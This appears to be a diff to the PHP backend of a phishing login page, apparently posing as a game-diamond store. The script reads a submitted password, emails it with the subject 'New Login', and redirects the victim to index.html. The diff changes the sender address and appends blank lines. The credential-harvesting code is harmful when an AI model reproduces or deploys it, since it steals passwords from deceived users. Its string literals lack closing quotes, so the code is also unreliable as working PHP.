@@ -6,7 +6,7 @@ $password = $_POST['password'];
 
 
 
-$email_from = 'info@ffdiamondstorebd.github.io;
+$email_from = 'info@github.io;
 
 $email_subject = 'New Login'
 
@@ -23,5 +23,17 @@ $headers .= "Reply-To: $number \r\n";
 mail($to,$email_subject,$email_body,$headers);
 
 header("Location: index.html");
+
+
+
+
+
+
+
+
+
+
+
+
 
 ?>
